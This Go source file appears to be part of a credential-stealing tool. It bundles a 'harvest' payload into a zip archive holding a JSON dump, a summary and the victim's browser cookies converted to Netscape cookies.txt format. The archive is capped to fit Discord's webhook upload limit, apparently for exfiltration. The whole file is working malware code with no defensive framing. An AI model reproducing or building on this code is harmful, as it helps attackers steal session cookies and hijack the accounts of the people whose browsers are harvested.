package main

import (
	"archive/zip"
	"bytes"
	"encoding/json"
	"fmt"
)

const maxDiscordUpload = 24 * 1024 * 1024 // stay under Discord 25MB webhook limit

func buildHarvestZip(p *harvestPayload) ([]byte, error) {
	if p == nil {
		return nil, fmt.Errorf("empty harvest payload")
	}

	jsonData, err := json.MarshalIndent(p, "", "  ")
	if err != nil {
		return nil, err
	}

	var buf bytes.Buffer
	zw := zip.NewWriter(&buf)

	writeEntry := func(name string, data []byte) error {
		w, err := zw.Create(name)
		if err != nil {
			return err
		}
		_, err = w.Write(data)
		return err
	}

	if err := writeEntry("harvest.json", jsonData); err != nil {
		_ = zw.Close()
		return nil, err
	}
	if err := writeEntry("summary.txt", []byte(harvestSummary(p))); err != nil {
		_ = zw.Close()
		return nil, err
	}
	if cookies := cookiesNetscape(p); len(cookies) > 0 {
		if err := writeEntry("cookies.txt", cookies); err != nil {
			_ = zw.Close()
			return nil, err
		}
	}

	if err := zw.Close(); err != nil {
		return nil, err
	}

	out := buf.Bytes()
	if len(out) > maxDiscordUpload {
		return nil, fmt.Errorf("harvest zip too large for Discord (%d bytes)", len(out))
	}
	return out, nil
}

func cookiesNetscape(p *harvestPayload) []byte {
	if p == nil || p.Result == nil || len(p.Result.Cookies) == 0 {
		return nil
	}
	var b bytes.Buffer
	b.WriteString("# Netscape HTTP Cookie File\n")
	for _, c := range p.Result.Cookies {
		domain := c.Host
		flag := "FALSE"
		if len(domain) > 0 && domain[0] == '.' {
			flag = "TRUE"
		}
		secure := "FALSE"
		if c.Secure {
			secure = "TRUE"
		}
		line := fmt.Sprintf("%s\t%s\t%s\t%s\t%d\t%s\t%s\n",
			domain, flag, c.Path, secure, c.ExpiresUTC, c.Name, c.Value)
		b.WriteString(line)
	}
	return b.Bytes()
}